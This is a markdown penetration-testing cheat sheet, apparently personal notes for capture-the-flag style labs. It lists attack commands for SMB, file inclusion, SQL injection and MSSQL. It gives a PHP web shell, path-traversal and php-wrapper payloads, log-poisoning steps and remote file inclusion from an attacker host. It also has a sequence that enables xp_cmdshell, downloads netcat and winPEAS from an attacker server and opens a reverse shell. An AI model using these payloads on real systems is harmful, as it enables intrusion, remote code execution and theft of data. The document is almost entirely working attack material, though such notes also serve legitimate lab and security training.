# :memo: General
## Nmap
- `nmap -sC -sV -oA nmap-scripts [TARGET]`
- `cat nmap-scripts.nmap`

## SMB
- Remember to add `-U guest` if want to specify user
- Login: `smbclient -L [TARGET]`
- List share content:
  - Using `dir` once logged
  - `smbclient \\\\[TARGET]\\[FOLDER] -c 'recurse;ls'`
- Download file: 
  - `smbget smb://[TARGET]/[FILENAME]`
  - `get [FILENAME]`

## Privilege escalation
- 

# :earth_africa: Website
## PHP Shell
- `<?php system($_GET['cmd']); ?>`

## File inclusion + Path traversal
- Try to navegate to /etc/passwd like: `https://[VICTIM]/?page=/etc/passwd`
- Path traversal `../../../../../etc/passwd`
- Url encoding ../ bypass
- Php wrappers
  - `php://filter/read=convert.base64-encode/resource=index`
  - `php://filter/read=convert.base64-encode/resource=/etc/passwd`
  - `php://filter/read=convert.base64-encode/resource=config`
  - `php://filter/read=string.rot13/resource=/etc/passwd`
  - `expect://id`
  - `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=id`
- Null byte injection
  - `/etc/passwd%00`
- User-agent poisoning:
  - `/var/log/apache2/access.log`
  - `/var/log/nginx/access.log`
  - Get php shell putting this as user-agent: `<?php system($_GET['cmd']); ?>`
  - Add this to GET request: `&cmd=id`
- Cookie session poisoning:
  - `/var/lib/php/sessions/sess_[COOKIE SESSION STRING]`
- Input wrapper:
  - `curl -s -X POST --data "<?php system('id'); ?>" "http://[VICTIM]/index.php?language=php://input" | grep uid`

## Remote inclusion
- Create shell.php with this content: `<?php system($_GET['cmd']); ?>`
- Http server:
  - `python3 -m http.server 8080 ` 
  - Upload by navigation: `http://[VICTIM IP]/index.php?language=http://[ATTACKER_IP]:8080/shell.php&cmd=id`
- Ftp server:
  - `python -m pyftpdlib -p 21`
  - Upload by navigation: `http://[VICTIM IP]/index.php?language=ftp://[ATTACKER_IP]/shell.php&cmd=id`
    - If need credentials, use: `ftp://user:pass@localhost/shell.php&cmd=id`

## GoBuster
- Find website files: `gobuster -m dir -u http://[TARGET] -t 20 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt,html`

## SQL Injection
- Brute-forcing user: `username=admin'#&password=1235`

## SQL Map
- `sqlmap -u http://10.129.80.244/ --data="username=admin&password=123456" --batch --dump tables`

## MySQL
- `mysql -h [TARGET] -u root`

## MSSQL
- Setup (manually from releases, don't git clone) https://github.com/SecureAuthCorp/impacket
- `python3 mssqlclient.py [HOST]/[USER]@[TARGET_IP] -windows-auth`
  - If logged in:
    - `SELECT is_srvrolemember('sysadmin');`
    - Test if cmdshell works: `EXEC xp_cmdshell 'net user';`
      - How to enable cmdshell:
        - `EXEC sp_configure 'show advanced options', 1;`
        - `RECONFIGURE;`
        - `sp_configure;`
        - `EXEC sp_configure 'xp_cmdshell', 1;`
        - `RECONFIGURE;`
    - Upload shell:
      - Mount web server: `sudo python3 -m http.server 80`
      - Netcat listenner: `sudo nc -lvnp 443`
      - Check directory: `xp_cmdshell "powershell -c pwd"`
      - Download shell: `xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget
http://[ATTACKER_WEBSITE]/nc64.exe -outfile nc64.exe"`
      - Launch shell: `xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe
[ATTACKER_IP] 443"`
        - `powershell`
        - `wget http://[ATTACKER_WEBSITE]/winPEASx64.exe -outfile winPEASx64.exe`

